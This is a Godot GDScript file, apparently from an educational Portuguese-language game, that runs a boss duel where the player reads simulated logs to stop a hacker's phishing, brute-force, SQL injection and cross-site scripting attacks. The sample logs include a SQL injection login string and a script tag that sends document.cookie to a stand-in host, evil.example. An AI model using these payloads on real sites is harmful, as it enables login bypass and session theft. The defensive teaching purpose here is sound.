extends RefCounted
## BossFight.gd
## Lógica do duelo final contra o hacker (sem interface: o TerminalManager
## mostra o texto e o BossManager cuida da cena e dos finais).
##
## Como funciona:
##   - A barra de disputa vai de 0 a 100 e mede o quanto a cidade é do jogador
##     (começa em 50). 100 = vitória; 0 = derrota.
##   - O hacker ataca em sequência, repetindo etapas que o jogador já fez nas
##     missões. Cada ataque tem um tempo (45 s no primeiro, menos nos
##     seguintes). Conter o ataque a tempo: +10. Deixar o tempo acabar: -10.
##   - Conter um ataque "atordoa" o hacker (fase stun): surge uma tarefa para
##     desmascará-lo ('unmask <valor>'). Acertar: +10 extra. Se o jogador não
##     fizer nada, o hacker só provoca e o próximo ataque começa.
##
## TODO(História): as falas, os nomes e as pistas abaixo são PROVISÓRIOS; a
## equipe de História decide quem é o hacker e o que ele diz.

signal said(kind: String, text: String)   # kind: boss, system, good, bad, info
signal changed
signal finished(won: bool)

const BAR_START := 50
const BAR_STEP := 10
const BAR_UNMASK_BONUS := 10
const STUN_SECONDS := 30.0
const WRONG_ANSWER_PENALTY := 3.0
## Depois do último ataque da lista, o duelo repete o último (com este tempo).
const MIN_ATTACK_SECONDS := 20.0

## Ataques, do mais fácil ao mais difícil (tempo decrescente). "accept" são
## as respostas aceitas (sem acentos, em minúsculas).
const ATTACKS := [
	{
		"title": "Chuva de e-mails falsos",
		"seconds": 45.0,
		"announce": "Disparando 4.000 e-mails falsos para todos os moradores da cidade!",
		"files": {
			"fila_envio.log": "[FILA DE ENVIO] 4012 mensagens aguardando\nremetente : suporte@citycred-seguro.net\nassunto   : URGENTE: sua conta sera bloqueada hoje\nlink      : http://citycred-seguro.net/entrar\ndestinos  : todos os moradores da cidade",
		},
		"accept": ["block citycred-seguro.net", "bloquear citycred-seguro.net"],
		"answer_hint": "block <domínio do remetente>",
		"hint": "Veja a fila de envio ('cat fila_envio.log'). Bloqueie o domínio do remetente: 'block <domínio>'.",
	},
	{
		"title": "Força bruta nos servidores",
		"seconds": 40.0,
		"announce": "Testando milhares de senhas nos servidores da prefeitura!",
		"files": {
			"acessos.log": "10:02:11 FALHA login admin  de 192.168.0.14\n10:02:12 FALHA login admin  de 203.0.113.77\n10:02:12 FALHA login root   de 203.0.113.77\n10:02:13 FALHA login admin  de 203.0.113.77\n10:02:13 FALHA login guest  de 203.0.113.77\n10:02:14 FALHA login admin  de 203.0.113.77\n10:02:15 OK    login maria  de 192.168.0.22\n10:02:15 FALHA login root   de 203.0.113.77",
		},
		"accept": ["block 203.0.113.77", "bloquear 203.0.113.77"],
		"answer_hint": "block <endereço IP>",
		"hint": "Leia 'acessos.log'. Um mesmo IP falha várias vezes seguidas: é ele. 'block <ip>'.",
	},
	{
		"title": "Porta aberta na rede",
		"seconds": 35.0,
		"announce": "Entrando por uma porta esquecida aberta na rede da cidade!",
		"files": {
			"portas.txt": "PORTA  SERVICO  ESTADO  ORIGEM PERMITIDA\n22     ssh      aberta  somente rede interna\n80     http     aberta  internet (site publico)\n23     telnet   aberta  internet (SEM SENHA, protocolo sem criptografia)\n443    https    aberta  internet (site publico)",
		},
		"accept": ["firewall block 23", "block porta 23", "block 23"],
		"answer_hint": "firewall block <porta>",
		"hint": "Em 'portas.txt', uma porta perigosa está aberta para a internet sem proteção. 'firewall block <porta>'.",
	},
	{
		"title": "Injeção SQL no portal",
		"seconds": 30.0,
		"announce": "Burlando o login do portal da cidade com SQL Injection!",
		"files": {
			"portal.log": "POST /contato  nome=Ana&msg=ola\nGET  /busca?q=praca\nPOST /login    usuario=' OR '1'='1' --&senha=x\nGET  /noticias\nPOST /contato  nome=Davi&msg=obrigado",
		},
		"accept": ["patch /login", "patch login", "fix /login", "fix login"],
		"answer_hint": "patch <endereço da página>",
		"hint": "Em 'portal.log', uma linha tem \"' OR '1'='1\": é o ataque. Corrija essa página com 'patch <página>'.",
	},
	{
		"title": "Script malicioso no fórum",
		"seconds": 25.0,
		"announce": "Plantando um script malicioso no fórum dos moradores!",
		"files": {
			"forum.log": "post 86  ana     Alguem sabe a hora do evento?\npost 87  davi    Na praca, as 18h.\npost 88  anon77  <script>document.location='http://evil.example/roubar?c='+document.cookie</script>\npost 89  maria   Obrigada!",
		},
		"accept": ["remove 88", "delete 88", "apagar 88", "remove post 88", "delete post 88", "apagar post 88"],
		"answer_hint": "apagar <número do post>",
		"hint": "Em 'forum.log', um post contém <script>. Apague-o: 'apagar <número>'.",
	},
]

## Tarefas de desmascaramento (uma por ataque contido; repetem em ciclo).
const UNMASKS := [
	{
		"prompt": "O ataque deixou um rastro. Descubra de onde ele REALMENTE vem: 'cat rastro.log' e 'unmask <ip>'.",
		"files": {
			"rastro.log": "salto 1  proxy-anonimo.example   (anonimizador)\nsalto 2  vpn-exterior.example      (anonimizador)\nsalto 3  10.13.37.5                 (origem real, vazou no cabecalho X-Forwarded-For)",
		},
		"accept": ["unmask 10.13.37.5"],
		"revealed": "IP de origem: 10.13.37.5 — dentro da própria cidade!",
	},
	{
		"prompt": "Um perfil antigo usa o mesmo estilo de código: 'cat perfil.txt' e 'unmask <apelido>'.",
		"files": {
			"perfil.txt": "Fórum 'hackers-br' — perfil encontrado pelo estilo do script\napelido : n0va_\nassunto favorito: 'como invadir sem ser notado'\nassinatura: 'Quem controla os dados controla a cidade.'",
		},
		"accept": ["unmask n0va_", "unmask nova_"],
		"revealed": "Apelido: n0va_ — o mesmo que assina os ataques.",
	},
	{
		"prompt": "O registro do domínio do ataque tem um dono: 'cat whois.txt' e 'unmask <nome>'.",
		"files": {
			"whois.txt": "dominio : citycred-seguro.net\ntitular : Cassio Vega\ncidade  : Cyber City\ncriado  : ha 3 dias",
		},
		"accept": ["unmask cassio vega"],
		"revealed": "Nome verdadeiro: Cássio Vega (provisório).",
	},
]

const TAUNT_START := [
	"Primeira rodada. Vamos ver se você lembra do que aprendeu.",
	"Só mais um ataque. Você tem tempo para pensar?",
	"Você não vai aguentar o ritmo.",
	"Cada vez mais rápido... e você cada vez mais devagar.",
	"Último aviso: eu não paro.",
]
const TAUNT_MID := [
	"Ainda lendo? O relógio não espera.",
	"Metade do tempo. Os moradores já estão clicando...",
	"Você nem começou, não é?",
]
const TAUNT_FAIL := [
	"Tarde demais! A cidade é minha por mais um pouco.",
	"Lento demais. Perdeu terreno.",
	"Eu avisei. Sinta a barra mudando.",
]
const TAUNT_STUN_IDLE := [
	"Nem tenta me desmascarar? Prova de que você ainda é só um iniciante.",
	"Eu fiquei parado e você não fez nada. Que decepção.",
]
const TAUNT_STUNNED := [
	"Você... travou meu ataque? Sorte de principiante!",
	"Como você fez isso tão rápido?!",
]
const TAUNT_UNMASKED := [
	"Isso... isso não devia estar ao seu alcance!",
	"Pare de mexer nos meus arquivos!",
]

var bar: int = BAR_START
## "idle", "attack", "stun", "won" ou "lost"
var phase: String = "idle"
var attack_index: int = 0
var time_left: float = 0.0
var wrong_answers: int = 0
var unmasked: int = 0
var attacks_contained: int = 0

var _mid_taunted: bool = false
var _unmask_index: int = 0


func start() -> void:
	bar = BAR_START
	attack_index = 0
	wrong_answers = 0
	unmasked = 0
	attacks_contained = 0
	_unmask_index = 0
	_begin_attack()


func is_running() -> bool:
	return phase == "attack" or phase == "stun"


## Ataque da vez (os da lista; passada a lista, repete o último).
func current_attack() -> Dictionary:
	return ATTACKS[mini(attack_index, ATTACKS.size() - 1)]


func attack_seconds(index: int) -> float:
	var attack: Dictionary = ATTACKS[mini(index, ATTACKS.size() - 1)]
	var seconds: float = float(attack["seconds"])
	if index >= ATTACKS.size():
		seconds = MIN_ATTACK_SECONDS
	return seconds


func current_unmask() -> Dictionary:
	return UNMASKS[_unmask_index % UNMASKS.size()]


## Arquivos que o jogador pode ler agora.
func visible_files() -> Dictionary:
	if phase == "attack":
		return current_attack()["files"]
	if phase == "stun":
		return current_unmask()["files"]
	return {}


## Linha de status mostrada no prompt do terminal (BBCode).
func status_bbcode() -> String:
	var filled: int = clampi(int(round(bar / 10.0)), 0, 10)
	var meter := "█".repeat(filled) + "░".repeat(10 - filled)
	var left := "%ds" % int(ceil(maxf(time_left, 0.0)))
	var label := ""
	match phase:
		"attack":
			label = "ATAQUE %d: %s" % [attack_index + 1, current_attack()["title"]]
		"stun":
			label = "HACKER ATORDOADO — desmascare!"
		_:
			label = "—"
	return "[color=#ffd75f]%s[/color]  [color=#2f8cff]CIDADE[/color] [color=#3dff6e]%s[/color] [color=#ff5f5f]HACKER[/color]  %d/%d  [color=#ffd75f]⏱ %s[/color]" % [label, meter, bar, 100 - bar, left]


# --- Tempo --------------------------------------------------------------------

func tick(delta: float) -> void:
	if not is_running():
		return
	time_left -= delta
	if phase == "attack":
		if not _mid_taunted and time_left <= attack_seconds(attack_index) * 0.5:
			_mid_taunted = true
			said.emit("boss", _pick(TAUNT_MID))
		if time_left <= 0.0:
			_attack_failed()
	elif time_left <= 0.0:
		# Fase de stun sem ação: o hacker só provoca.
		said.emit("boss", _pick(TAUNT_STUN_IDLE))
		_next_attack()
	changed.emit()


func _begin_attack() -> void:
	phase = "attack"
	time_left = attack_seconds(attack_index)
	_mid_taunted = false
	var attack := current_attack()
	said.emit("system", "== ATAQUE %d: %s (%d s) ==" % [attack_index + 1, attack["title"], int(time_left)])
	said.emit("boss", TAUNT_START[mini(attack_index, TAUNT_START.size() - 1)])
	said.emit("bad", String(attack["announce"]))
	said.emit("info", "Arquivos: " + ", ".join(PackedStringArray(attack["files"].keys())) + "   |   resposta: " + String(attack["answer_hint"]))
	changed.emit()


func _attack_failed() -> void:
	said.emit("bad", "Tempo esgotado! O ataque passou.")
	said.emit("boss", _pick(TAUNT_FAIL))
	_move_bar(-BAR_STEP)
	if is_running():
		_next_attack()


func _next_attack() -> void:
	attack_index += 1
	_begin_attack()


# --- Comandos -----------------------------------------------------------------

## Trata um comando digitado. Devolve true se o duelo o consumiu (o terminal
## normal não deve tratá-lo). Fora do duelo em andamento, nunca consome.
func handle_command(command: String) -> bool:
	if not is_running():
		return false
	var text := normalize(command)
	var parts := text.split(" ", false)
	if parts.is_empty():
		return true
	match parts[0]:
		"help", "ajuda":
			_help()
			return true
		"ls", "files":
			_list_files()
			return true
		"cat", "read":
			_read_file(parts)
			return true
		"status":
			said.emit("info", "Barra: cidade %d / hacker %d. Tempo: %d s." % [bar, 100 - bar, int(ceil(time_left))])
			return true
		"dica", "dicas":
			_hint()
			return true
		"desistir", "giveup":
			said.emit("bad", "Você largou o teclado...")
			_end(false)
			return true

	if phase == "stun":
		if text.begins_with("unmask"):
			_try_unmask(text)
			return true
		return false
	if _is_answer_attempt(parts[0]):
		_try_answer(text)
		return true
	return false


func _is_answer_attempt(verb: String) -> bool:
	return verb in ["block", "bloquear", "firewall", "patch", "fix", "remove", "delete", "apagar", "unmask"]


func _try_answer(text: String) -> void:
	if text in current_attack()["accept"]:
		_attack_contained()
		return
	wrong_answers += 1
	time_left -= WRONG_ANSWER_PENALTY
	said.emit("bad", "Isso não detém o ataque (-%d s). Leia os arquivos de novo." % int(WRONG_ANSWER_PENALTY))
	changed.emit()


func _attack_contained() -> void:
	attacks_contained += 1
	said.emit("good", "Ataque contido! A cidade respira.")
	said.emit("boss", _pick(TAUNT_STUNNED))
	_move_bar(BAR_STEP)
	if not is_running():
		return
	phase = "stun"
	time_left = STUN_SECONDS
	var task := current_unmask()
	said.emit("system", "== HACKER ATORDOADO (%d s) ==" % int(STUN_SECONDS))
	said.emit("info", String(task["prompt"]))
	said.emit("info", "Arquivos: " + ", ".join(PackedStringArray(task["files"].keys())))
	changed.emit()


func _try_unmask(text: String) -> void:
	if text in current_unmask()["accept"]:
		unmasked += 1
		said.emit("good", String(current_unmask()["revealed"]))
		said.emit("boss", _pick(TAUNT_UNMASKED))
		_unmask_index += 1
		_move_bar(BAR_UNMASK_BONUS)
		if is_running():
			_next_attack()
		return
	wrong_answers += 1
	time_left -= WRONG_ANSWER_PENALTY
	said.emit("bad", "Não é isso. Examine o arquivo com calma.")
	changed.emit()


func _help() -> void:
	said.emit("info", "ls — lista os arquivos do ataque    cat <arquivo> — lê um arquivo")
	said.emit("info", "status — barra e tempo    dica — ajuda    desistir — entrega o duelo")
	said.emit("info", "Para conter o ataque, use o comando de resposta mostrado no início de cada ataque.")


func _list_files() -> void:
	for name in visible_files().keys():
		said.emit("info", String(name))


func _read_file(parts: PackedStringArray) -> void:
	if parts.size() < 2:
		said.emit("bad", "Use: cat <arquivo>")
		return
	var files := visible_files()
	for name in files.keys():
		if normalize(String(name)) == parts[1]:
			for line in String(files[name]).split("\n"):
				said.emit("plain", line)
			return
	said.emit("bad", "cat: %s: arquivo não encontrado (use 'ls')" % parts[1])


func _hint() -> void:
	if phase == "attack":
		said.emit("info", String(current_attack()["hint"]))
	else:
		said.emit("info", String(current_unmask()["prompt"]))


# --- Barra e fim ----------------------------------------------------------------

func _move_bar(amount: int) -> void:
	bar = clampi(bar + amount, 0, 100)
	if bar >= 100:
		_end(true)
	elif bar <= 0:
		_end(false)


func _end(won: bool) -> void:
	if not is_running():
		return
	phase = "won" if won else "lost"
	bar = 100 if won else 0
	changed.emit()
	finished.emit(won)


# --- Utilidades -----------------------------------------------------------------

func _pick(options: Array) -> String:
	return String(options[randi() % options.size()])


## Minúsculas, sem acentos e com espaços simples (para comparar respostas).
static func normalize(text: String) -> String:
	var out := text.strip_edges().to_lower()
	for pair in [["á", "a"], ["à", "a"], ["â", "a"], ["ã", "a"], ["é", "e"], ["ê", "e"],
			["í", "i"], ["ó", "o"], ["ô", "o"], ["õ", "o"], ["ú", "u"], ["ç", "c"]]:
		out = out.replace(pair[0], pair[1])
	return " ".join(out.split(" ", false))
